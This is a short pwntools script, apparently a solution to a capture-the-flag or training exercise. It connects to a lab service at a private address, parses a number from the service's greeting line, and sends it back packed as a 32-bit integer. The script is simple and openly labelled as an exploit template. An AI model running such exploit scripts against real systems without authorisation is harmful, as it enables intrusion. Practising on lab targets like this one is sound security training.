#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

context.update(arch='i386')

io = remote('192.168.12.128', 2999)
line = io.recvlineS().split('\'')
print(line)
val = int(line[1], 10)
print(val)
io.send(p32(val))
print(io.recvlineS())
